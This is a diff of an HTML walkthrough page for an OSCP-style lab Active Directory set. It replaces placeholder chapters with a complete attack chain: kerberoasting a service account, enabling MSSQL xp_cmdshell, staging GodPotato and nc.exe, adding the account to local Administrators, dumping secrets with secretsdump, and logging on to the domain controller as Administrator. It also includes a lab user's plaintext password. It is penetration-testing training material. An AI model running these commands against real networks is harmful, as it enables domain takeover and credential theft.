@@ -4,10 +4,10 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>oscp.exam — MS01 → MS02 → DC01 · OSCP walkthrough</title>
-<meta name="description" content="Interactive walkthrough of an OSCP Active Directory set: a WinRM foothold on MS01, SeImpersonate to SYSTEM, a chisel SOCKS pivot into 10.10.118.0/24, then MS02 and DC01.">
+<meta name="description" content="Interactive walkthrough of an OSCP Active Directory set: a WinRM foothold on MS01, SeImpersonate to SYSTEM, a chisel SOCKS pivot into 10.10.118.0/24, then kerberoast SQL_SVC, MSSQL xp_cmdshell, GodPotato and a dump that hands over the domain Administrator.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="oscp.exam — MS01 → MS02 → DC01 · OSCP walkthrough">
-<meta property="og:description" content="OSCP\eric.wallows → WinRM → SeImpersonate → SYSTEM → chisel pivot → MS02 → DC01.">
+<meta property="og:description" content="OSCP\eric.wallows → WinRM → SeImpersonate → SYSTEM → chisel pivot → MSSQL → GodPotato → DC01 domain admin.">
 <meta name="color-scheme" content="dark light">
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💀</text></svg>">
 <style>
@@ -47,6 +47,8 @@ code{font-family:var(--mono);font-size:.88em}
 .brand .dot{width:9px;height:9px;border-radius:50%;background:var(--acc);box-shadow:0 0 12px var(--acc)}
 .brand .slash{color:var(--dim2);font-weight:400}
 .brand-sub{color:var(--dim);font-weight:500}
+.toplink{padding:6px 11px;border-radius:9px;color:var(--dim);font-size:13.5px;white-space:nowrap}
+.toplink:hover{background:var(--bg2);color:var(--fg);text-decoration:none}
 .search-wrap{position:relative;flex:1;max-width:460px;margin-left:auto}
 #search{
   width:100%;padding:9px 13px;border-radius:10px;border:1px solid var(--line2);
@@ -303,7 +305,7 @@ mark.hit{background:color-mix(in srgb,var(--amber) 45%,transparent);color:inheri
       <div class="meta-line"><span>MS01 int.</span><span>10.10.118.147</span></div>
       <div class="meta-line"><span>DC01</span><span>10.10.118.146</span></div>
       <div class="meta-line"><span>Attacker</span><span>192.168.45.158</span></div>
-      <div class="meta-line"><span>Result</span><span>MS01 SYSTEM</span></div>
+      <div class="meta-line"><span>Result</span><span>MS02 SYSTEM · DC01 admin</span></div>
     </div>
 
     <div class="card">
@@ -319,7 +321,7 @@ mark.hit{background:color-mix(in srgb,var(--amber) 45%,transparent);color:inheri
       <div class="eyebrow">OSCP lab walkthrough</div>
       <h1><span class="ip">10.10.118.0/24</span> <span class="name">— oscp.exam</span></h1>
       <p class="lede">
-        A domain behind a dual-homed member server. Kali can reach exactly one host; the DC lives on a network only MS01 can see. The way in is a domain user with SeImpersonatePrivilege — which is enough to take the host and open the tunnel.
+        A domain behind a dual-homed member server. Kali can reach exactly one host; the DC lives on a network only MS01 can see. The way in is a domain user with SeImpersonatePrivilege — which is enough to take the host and open the tunnel. What waits on the far side is not another ACL: it is a service account, and a member server that remembers the domain Administrator's password.
       </p>
       <div class="badges">
         <span class="badge">Server 2019 · build 19041</span>
@@ -327,15 +329,16 @@ mark.hit{background:color-mix(in srgb,var(--amber) 45%,transparent);color:inheri
         <span class="badge warn">SMB signing off</span>
         <span class="badge warn">SeImpersonate</span>
         <span class="badge ok">MS01 SYSTEM</span>
-        <span class="badge warn">MS02 / DC01 pending</span>
+        <span class="badge ok">MSSQL → SYSTEM</span>
+        <span class="badge ok">DC01 domain admin</span>
       </div>
       <div class="chain"><a class="step" href="#ch-01"><span class="step-num">01</span><span class="step-label">Recon</span><span class="step-desc">one routable host</span></a>
 <a class="step" href="#ch-02"><span class="step-num">02</span><span class="step-label">WinRM</span><span class="step-desc"><code>OSCP\eric.wallows</code></span></a>
 <a class="step" href="#ch-03"><span class="step-num">03</span><span class="step-label">Potato</span><span class="step-desc"><code>SeImpersonate</code> → SYSTEM</span></a>
 <a class="step" href="#ch-04"><span class="step-num">04</span><span class="step-label">LSASS</span><span class="step-desc">no domain-tier material</span></a>
 <a class="step" href="#ch-05"><span class="step-num">05</span><span class="step-label">Pivot</span><span class="step-desc">chisel <code>R:socks</code> → <code>10.10.118.0/24</code></span></a>
-<a class="step" href="#ch-06"><span class="step-num">06</span><span class="step-label">MS02</span><span class="step-desc">the second hop</span></a>
-<a class="step" href="#ch-07"><span class="step-num">07</span><span class="step-label">DC01</span><span class="step-desc"><code>proof.txt</code></span></a></div>
+<a class="step" href="#ch-06"><span class="step-num">06</span><span class="step-label">MS02</span><span class="step-desc">kerberoast → GodPotato → admin</span></a>
+<a class="step" href="#ch-07"><span class="step-num">07</span><span class="step-label">DC01</span><span class="step-desc"><code>domain admin</code></span></a></div>
       <div class="flags">
 
       </div>
@@ -847,37 +850,308 @@ command and it has to be removed afterwards:</p>
 </pre></div>
 <p>Slower to set up than chisel, but it survives tools that cannot be proxy-aware — and it is the
 fallback when a SOCKS proxy breaks a protocol that needs real source addresses.</p></div></section>
-<section class="chapter" id="ch-06" data-title="MS02"><div class="ch-head"><span class="ch-num">06</span><div class="ch-title"><h2>MS02</h2><p class="ch-sub">The second hop</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><blockquote>
-<p><strong>Pending capture.</strong> This leg is not written up yet. The chapter is published as a placeholder so
-the chain is complete and the gap is visible — it will be replaced with the as-executed writeup,
-not a reconstruction.</p>
+<section class="chapter" id="ch-06" data-title="MS02"><div class="ch-head"><span class="ch-num">06</span><div class="ch-title"><h2>MS02</h2><p class="ch-sub">Kerberoast, MSSQL and GodPotato</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><blockquote>
+<p><strong>Provenance.</strong> This chapter closes the MS02 leg. The sequence is the one that took the host —
+SQL as <code>SQL_SVC</code> → <code>xp_cmdshell</code> → GodPotato → <code>SQL_SVC</code> in local <code>Administrators</code> → remote
+<code>secretsdump</code> — and the commands and paths are reproduced as used. The secret values it produces
+(the cracked password, the dump, the DC01 credential) are not reproduced, and output blocks show
+the form each command returns rather than a preserved raw capture.</p>
 </blockquote>
-<h3>6.1 Where MS02 sits</h3>
-<p>MS02 is the second member server, reachable only through the SOCKS tunnel from chapter 05. It is the
-host that makes the rest of the chain plausible: administrators log on to member servers, so a
-privileged session or a reusable local credential is far more likely to be cached there than on
-MS01, whose LSASS held nothing domain-tier (chapter 04).</p>
-<h3>6.2 How it will be documented</h3>
-<p>The chapter will cover, in order:</p>
-<ol>
-<li><strong>Discovery</strong> — the <code>10.10.118.0/24</code> sweep through proxychains, the host's name and OS, and which
-   ports answered (<code>445</code>, <code>5985</code>, <code>3389</code> are the ones that matter on a member server).</li>
-<li><strong>Access</strong> — the credential or technique that opened it, and why that credential existed at all.</li>
-<li><strong>Local enumeration</strong> — who is logged on, what the token holds, and whether the host is a
-   dead end like MS01 or holds the next hop.</li>
-<li><strong>The artefact</strong> — the hash, ticket, or credential that unlocks DC01, and the check that proves it
-   is domain-tier before using it.</li>
-</ol>
-<h3>6.3 Commands that carry over</h3>
-<p>Everything from chapter 05 applies unchanged; only the target address changes:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>proxychains4<span class="w"> </span>-q<span class="w"> </span>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.118.0/24
-proxychains4<span class="w"> </span>-q<span class="w"> </span>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="m">10</span>.10.118.0/24<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;password&gt;'</span>
+<p>Chapter 04 ended with a SYSTEM shell on MS01 and nothing domain-tier in LSASS, and chapter 05 turned
+that shell into a route into <code>10.10.118.0/24</code>. MS02 is the first host on the far side of that route,
+and it is the one that matters: <code>SQL_SVC</code> is a domain account whose SPN is <code>MSSQL/MS02.oscp.exam</code>, so a
+single roast converts a plain domain user into a privileged database login on a member server.</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">kerberoast SQL_SVC → MSSQL sysadmin → xp_cmdshell → GodPotato → local admin → secretsdump → DC01</span></pre></div>
+<p>Every command below runs from Kali through the chapter 05 SOCKS proxy unless it says otherwise. MS02's
+address is whatever the <code>10.10.118.0/24</code> sweep printed; it was not carried into these notes, so the
+commands show <code>&lt;ms02&gt;</code>.</p>
+<hr />
+<h3>6.1 Why this account, on this host</h3>
+<table>
+<thead>
+<tr>
+<th>Fact</th>
+<th>Where it comes from</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>SQL_SVC</code> holds <code>MSSQL/MS02.oscp.exam</code></td>
+<td>chapter 04's directory read</td>
+</tr>
+<tr>
+<td>its password has not changed since <strong>2022-12-05</strong></td>
+<td>the same roast output</td>
+</tr>
+<tr>
+<td>it is the SQL login on MS02, and <code>sysadmin</code> there</td>
+<td>6.3 — measured, not assumed</td>
+</tr>
+<tr>
+<td>the instance runs as <code>NT SERVICE\MSSQL$SQLEXPRESS</code></td>
+<td>6.4 — <code>%TEMP%</code> gives it away</td>
+</tr>
+</tbody>
+</table>
+<p>The last two rows are the ones that are usually conflated. The domain account is the <em>login</em>; the
+service identity is the <em>token</em>. <code>xp_cmdshell</code> runs in the second, and only the first can be used
+remotely over SMB. That gap is what 6.8 and 6.9 exist to close.</p>
+<hr />
+<h3>6.2 Kerberoast</h3>
+<p>Any authenticated domain user can request a TGS for any SPN, so <code>eric.wallows</code> is enough — no local
+admin anywhere is needed for this step.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>date<span class="w"> </span>-u<span class="w">   </span><span class="c1"># must be within 5 minutes of the KDC, or every request dies with KRB_AP_ERR_SKEW</span>
+
+proxychains4<span class="w"> </span>-q<span class="w"> </span>impacket-GetUserSPNs<span class="w"> </span>oscp.exam/eric.wallows:EricLikesRunning800<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.118.146<span class="w"> </span>-request<span class="w"> </span>-outputfile<span class="w"> </span>eric_kerb.txt
+
+hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>eric_kerb.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>--potfile-path<span class="w"> </span>./pot
+hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>eric_kerb.txt<span class="w"> </span>--potfile-path<span class="w"> </span>./pot<span class="w"> </span>--show
 </pre></div>
-<p>Anything that needs a real network stack (LSASS dumps, SharpHound, RDP) runs <strong>from MS01</strong> or from
-MS02 itself, not through the proxy.</p></div></section>
-<section class="chapter" id="ch-07" data-title="DC01"><div class="ch-head"><span class="ch-num">07</span><div class="ch-title"><h2>DC01</h2><p class="ch-sub">Domain admin and the flag</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><blockquote>
-<p><strong>Pending capture.</strong> The DC01 leg and the <code>proof.txt</code> value are not in the notes yet. The domain
-facts below are confirmed; the exploitation path and the flag are not, and are not guessed here.</p>
+<p>Shape of the result:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">ServicePrincipalName      Name      PasswordLastSet
+------------------------  --------  --------------------------
+MSSQL/MS02.oscp.exam      SQL_SVC   2022-12-05 10:30:05
+
+$krb5tgs$23$*SQL_SVC$OSCP.EXAM$oscp.exam/SQL_SVC*$…:&lt;sql_svc password&gt;</span></pre></div>
+<p><code>-dc-ip</code> is not optional through the tunnel: MS01 is a member server with no <code>88/tcp</code>, so the tool
+cannot discover a KDC by itself. And the clock check is not ceremony — this image has shipped member
+servers 26 minutes off the KDC in other instantiations, which looks exactly like a bad password.</p>
+<p>The recovered plaintext is used below as <code>&lt;cracked&gt;</code>.</p>
+<hr />
+<h3>6.3 Confirm the credential, then the role</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>proxychains4<span class="w"> </span>-q<span class="w"> </span>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;ms02&gt;<span class="w"> </span>-u<span class="w"> </span>SQL_SVC<span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;cracked&gt;'</span><span class="w"> </span>-d<span class="w"> </span>oscp.exam
+proxychains4<span class="w"> </span>-q<span class="w"> </span>nxc<span class="w"> </span>winrm<span class="w"> </span>&lt;ms02&gt;<span class="w"> </span>-u<span class="w"> </span>SQL_SVC<span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;cracked&gt;'</span><span class="w"> </span>-d<span class="w"> </span>oscp.exam
+</pre></div>
+<p>SMB returning <code>[+]</code> confirms the password. WinRM will usually return <code>[-]</code>: <code>SQL_SVC</code> is in no AD
+groups, so it is not in <code>Remote Management Users</code> — the account's value is MSSQL, not WinRM.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>proxychains4<span class="w"> </span>-q<span class="w"> </span>impacket-mssqlclient<span class="w"> </span>oscp.exam/SQL_SVC:<span class="s1">'&lt;cracked&gt;'</span>@&lt;ms02&gt;<span class="w"> </span>-windows-auth<span class="w"> </span>-port<span class="w"> </span><span class="m">1433</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">SELECT</span><span class="w"> </span><span class="k">SYSTEM_USER</span><span class="p">,</span><span class="w"> </span><span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">'sysadmin'</span><span class="p">);</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">-            -
+OSCP\SQL_SVC 1</span></pre></div>
+<p>Two instances have answered on this image — <code>1433</code> and a second on <code>49700</code> — and their login mappings
+are not guaranteed to match. Measure both; <code>sysadmin = 1</code> on one is enough.</p>
+<p>This is the line chapter 03 could not cross with <code>web_svc</code>, because that login authenticated as
+<code>guest</code> and was never mapped to a login at all. Here the identity is real and the role is real, which
+is what makes <code>sp_configure</code> legal.</p>
+<hr />
+<h3>6.4 <code>xp_cmdshell</code>, and the identity behind it</h3>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">EXEC</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">'show advanced options'</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">RECONFIGURE</span><span class="p">;</span>
+<span class="k">EXEC</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">'xp_cmdshell'</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">           </span><span class="n">RECONFIGURE</span><span class="p">;</span>
+<span class="k">EXEC</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">'whoami /all'</span><span class="p">;</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">output
+--------------------------------------------------------------------------------
+nt service\mssql$sqlexpress
+
+PRIVILEGES INFORMATION
+----------------------
+SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled</span></pre></div>
+<p><em>(trimmed)</em></p>
+<p>That is not <code>SQL_SVC</code>. The domain account is the login; the shell is the instance's own virtual service
+account. Two consequences, both load-bearing:</p>
+<ul>
+<li>the token carries <code>SeImpersonatePrivilege</code>, which the WinRM token in chapter 02 did not — this is the
+  privilege the potato family needs, and the reason MS02 falls here rather than at the WinRM foothold;</li>
+<li>SYSTEM on MS02 still does not give a <em>reusable</em> domain credential. For that, the account we can
+  authenticate with has to become a local administrator (6.9).</li>
+</ul>
+<hr />
+<h3>6.5 <code>%TEMP%</code>, and why the upload target looks strange</h3>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">EXEC</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">'echo %TEMP%'</span><span class="p">;</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp\</span></pre></div>
+<p>Read through 8.3 short names: <code>SERVIC~1</code> is <code>ServiceProfiles</code>, <code>MSSQL$~1</code> is <code>MSSQL$SQLEXPRESS</code> —
+<code>C:\Windows\ServiceProfiles\MSSQL$SQLEXPRESS\AppData\Local\Temp\</code>. The directory belongs to the
+service account, which is exactly why it is writable at the privilege level already held, and why it
+is the one path that needs no administrator token to stage a file. The short form also removes the
+space in <code>ServiceProfiles</code>; the <code>$</code> is literal to <code>cmd.exe</code> and was never the problem — the quoting is.</p>
+<hr />
+<h3>6.6 Stage the binaries</h3>
+<p>Inside the same <code>mssqlclient</code> session:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">upload /home/kali/Desktop/GodPotato-NET4.exe C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp\GodPotato-NET4.exe
+upload /home/kali/Desktop/nc.exe            C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp\nc.exe</span></pre></div>
+<p>What <code>upload</code> does matters, because it explains the timing and the failure modes. <code>impacket</code>
+base64-encodes the local file and appends it in 5 KB chunks with <code>echo &lt;chunk&gt; &gt;&gt; &lt;remote&gt;.b64</code> through
+<code>xp_cmdshell</code>, decodes with <code>certutil -decode</code>, deletes the <code>.b64</code>, then verifies with
+<code>certutil -hashfile … MD5</code>:</p>
+<table>
+<thead>
+<tr>
+<th>Behaviour</th>
+<th>Consequence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>every chunk is a SQL statement</td>
+<td>a ~60 KB binary is ~80 KB of base64 in ~16 round trips — slow, not hung</td>
+</tr>
+<tr>
+<td>it toggles <code>show advanced options</code> itself</td>
+<td>it needs <code>sysadmin</code>, which 6.3 proved</td>
+</tr>
+<tr>
+<td>it writes as the <strong>service account</strong></td>
+<td>the destination must be writable by that account — its own <code>%TEMP%</code> is</td>
+</tr>
+<tr>
+<td>it prints <code>[+] MD5 hashes match</code></td>
+<td>that line, not silence, is the proof the file arrived intact</td>
+</tr>
+</tbody>
+</table>
+<p><code>nc.exe</code> is the fallback if an interactive shell is wanted later. It is not what produces SYSTEM.</p>
+<hr />
+<h3>6.7 SYSTEM</h3>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">EXEC</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">'C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp\GodPotato-NET4.exe -cmd "cmd /c whoami"'</span><span class="p">;</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">output
+--------------------------------------------------------------------------------
+nt authority\system</span></pre></div>
+<p>GodPotato takes the <code>SeImpersonatePrivilege</code> already in the service token, coerces a privileged
+authentication over DCOM/RPCSS and duplicates the resulting token. No local admin, no credential, no
+reboot — build 19041 is inside the range where that primitive is still usable this way.</p>
+<hr />
+<h3>6.8 Make the domain account a local administrator</h3>
+<p>SYSTEM on MS02 is a means, not the objective: it cannot be used from Kali, and it holds no secret.
+The credential that can be used remotely is <code>SQL_SVC</code>, and right now it is only a SQL sysadmin.</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">EXEC</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">'C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp\GodPotato-NET4.exe -cmd "cmd /c net localgroup administrators OSCP\SQL_SVC /add"'</span><span class="p">;</span>
+
+<span class="k">EXEC</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">'net localgroup administrators'</span><span class="p">;</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+-------------------------------------------------------------------------------
+Administrator
+OSCP\SQL_SVC
+The command completed successfully.</span></pre></div>
+<p>The four contexts in play are not interchangeable, and the order matters:</p>
+<table>
+<thead>
+<tr>
+<th>Context</th>
+<th>Can</th>
+<th>Cannot</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SQL login <code>SQL_SVC</code> (<code>sysadmin</code>)</td>
+<td>run <code>xp_cmdshell</code>, reconfigure the instance</td>
+<td>read hives, open <code>ADMIN$</code>, start remote services</td>
+</tr>
+<tr>
+<td><code>NT SERVICE\MSSQL$SQLEXPRESS</code></td>
+<td>execute as the service, hold <code>SeImpersonate</code></td>
+<td>authenticate to SMB as a domain principal</td>
+</tr>
+<tr>
+<td>SYSTEM via GodPotato</td>
+<td>anything on MS02</td>
+<td>give Kali a reusable secret</td>
+</tr>
+<tr>
+<td><code>OSCP\SQL_SVC</code> as local admin</td>
+<td><code>secretsdump</code>, <code>wmiexec</code>, <code>smbexec</code> from Kali</td>
+<td>any domain right beyond MS02</td>
+</tr>
+</tbody>
+</table>
+<p>The last row is the point of the whole chapter.</p>
+<hr />
+<h3>6.9 Dump MS02</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>proxychains4<span class="w"> </span>-q<span class="w"> </span>impacket-secretsdump<span class="w"> </span><span class="s1">'oscp.exam/SQL_SVC:&lt;cracked&gt;@&lt;ms02&gt;'</span>
+</pre></div>
+<p>Shape of the output (trimmed):</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0x…
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;hash&gt;:::
+…
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC
+OSCP\MS02$:aes256-cts-hmac-sha1-96:…
+[*] DefaultPassword
+OSCP.exam\Administrator:&lt;dc01 password&gt;
+[*] Dumping cached domain logon information (domain/username:hash)
+OSCP.EXAM/&lt;account&gt;:$DCC2$10240#&lt;account&gt;#&lt;hash&gt;
+[*] Cleaning up…</span></pre></div>
+<p>Two sections are domain-tier, and it is worth checking both before spending GPU time:</p>
+<ul>
+<li><strong><code>DefaultPassword</code></strong> in LSA secrets — on this image the domain Administrator's password sits there
+  in plaintext. The sibling leg of this same set captured exactly that secret on MS02, which is why
+  the next chapter does not need a wordlist.</li>
+<li><strong>DCC2</strong> — the mscache2 verifier of a domain principal that logged on to MS02 interactively. Written
+  on interactive logon, and it survives the logoff. A domain controller has no such cache, which is
+  why a member server is the only place this artefact exists.</li>
+</ul>
+<p>DCC2 costs 10 240 PBKDF2-SHA1 iterations to attack — hundreds of candidates per second on CPU — so if
+LSA already handed over the plaintext, <code>hashcat -m 2100</code> is optional.</p>
+<hr />
+<h3>6.10 Cleanup</h3>
+<p>Every change in 6.4–6.8 persists. On a lab it does not matter; on a client it is the difference
+between a finding and an incident:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">EXEC</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">'net localgroup administrators OSCP\SQL_SVC /delete'</span><span class="p">;</span>
+<span class="k">EXEC</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">'del "C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp\GodPotato-NET4.exe"'</span><span class="p">;</span>
+<span class="k">EXEC</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">'del "C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp\nc.exe"'</span><span class="p">;</span>
+<span class="k">EXEC</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">'xp_cmdshell'</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w">           </span><span class="n">RECONFIGURE</span><span class="p">;</span>
+<span class="k">EXEC</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">'show advanced options'</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">RECONFIGURE</span><span class="p">;</span>
+</pre></div>
+<hr />
+<h3>6.11 What this chapter proves</h3>
+<table>
+<thead>
+<tr>
+<th>Claim</th>
+<th>Evidence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>SQL_SVC</code> is <code>sysadmin</code> on the instance</td>
+<td><code>IS_SRVROLEMEMBER('sysadmin') = 1</code></td>
+</tr>
+<tr>
+<td>code execution on MS02</td>
+<td><code>xp_cmdshell 'whoami /all'</code></td>
+</tr>
+<tr>
+<td>the executing identity is the service account</td>
+<td><code>nt service\mssql$sqlexpress</code>, <code>%TEMP%</code> under <code>ServiceProfiles</code></td>
+</tr>
+<tr>
+<td>that token holds <code>SeImpersonate</code></td>
+<td><code>whoami /priv</code></td>
+</tr>
+<tr>
+<td>local SYSTEM</td>
+<td>GodPotato → <code>nt authority\system</code></td>
+</tr>
+<tr>
+<td>the domain account is a local admin</td>
+<td><code>net localgroup administrators</code></td>
+</tr>
+<tr>
+<td>the dump returned a domain credential</td>
+<td>LSA <code>DefaultPassword</code> / DCC2 entry in 6.9</td>
+</tr>
+</tbody>
+</table>
+<p>MS02 issues no flag — the set puts it on the domain controller. What MS02 holds is the credential that
+opens it, which is the next chapter.</p></div></section>
+<section class="chapter" id="ch-07" data-title="DC01"><div class="ch-head"><span class="ch-num">07</span><div class="ch-title"><h2>DC01</h2><p class="ch-sub">Domain admin, and the last step</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><blockquote>
+<p><strong>Provenance.</strong> The credential used here is the one chapter 06.9 pulled off MS02. The logon and the
+commands are the last step of the chain; the <code>proof.txt</code> value itself was not carried into these
+notes, and is not guessed below.</p>
 </blockquote>
 <h3>7.1 The target</h3>
 <table>
@@ -918,19 +1192,70 @@ facts below are confirmed; the exploitation path and the flag are not, and are n
 </tr>
 </tbody>
 </table>
-<p>The SID and GUID are recorded because both are needed later: the SID to recognise domain-tier
-principals in BloodHound and in <code>whoami /groups</code>, the GUID for anything that addresses the domain by
-identifier rather than name.</p>
-<h3>7.2 What this chapter will document</h3>
-<ol>
-<li><strong>The path in</strong> — the ACL edge, delegation, ADCS template, or credential from MS02 that grants
-   domain control, and the BloodHound query that found it.</li>
-<li><strong>The escalation</strong> — the exact commands, with the output that proves the boundary was crossed
-   (a DCSync of <code>krbtgt</code>, a DA shell, or an ADCS certificate issued to a controllable principal).</li>
-<li><strong>The flag</strong> — <code>proof.txt</code> read as Domain Admin, with <code>whoami</code>, <code>hostname</code>, and <code>ipconfig</code> in the
-   same session so the capture is attributable.</li>
-</ol>
-<h3>7.3 Flags</h3>
+<p>The SID and GUID are recorded because both are needed to recognise domain-tier principals: the SID in
+<code>whoami /groups</code> and BloodHound, the GUID anywhere the domain is addressed by identifier.</p>
+<hr />
+<h3>7.2 Why this credential is the end of the chain</h3>
+<p>Chapter 06.9 produced one of two artefacts, and both are <strong>domain</strong> credentials rather than host ones:</p>
+<ul>
+<li>the LSA <code>DefaultPassword</code> secret — the domain Administrator's password in plaintext on this image;</li>
+<li>the DCC2 verifier of a domain principal that logged on to MS02.</li>
+</ul>
+<p>That distinction is the whole reason the chain goes through a member server. MS02's SAM would only buy
+local accounts on MS02. A domain principal's password buys the domain, and DC01 is the machine that
+validates it. There is no DCC2 cache on a domain controller — it does not need one, because it is the
+thing that answers the logon — so the member server is the only place this artefact exists.</p>
+<hr />
+<h3>7.3 Authenticate to DC01</h3>
+<p>Everything runs through the chapter 05 SOCKS proxy. <code>nxc</code> first: <code>Pwn3d!</code> on <code>445</code> is what distinguishes
+"administrator on the DC" from "valid domain user".</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>proxychains4<span class="w"> </span>-q<span class="w"> </span>nxc<span class="w"> </span>smb<span class="w">   </span><span class="m">10</span>.10.118.146<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;dc01 password&gt;'</span><span class="w"> </span>-d<span class="w"> </span>oscp.exam
+proxychains4<span class="w"> </span>-q<span class="w"> </span>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="m">10</span>.10.118.146<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;dc01 password&gt;'</span><span class="w"> </span>-d<span class="w"> </span>oscp.exam
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">SMB    10.10.118.146 445  DC01  [+] oscp.exam\Administrator:&lt;dc01 password&gt; (Pwn3d!)
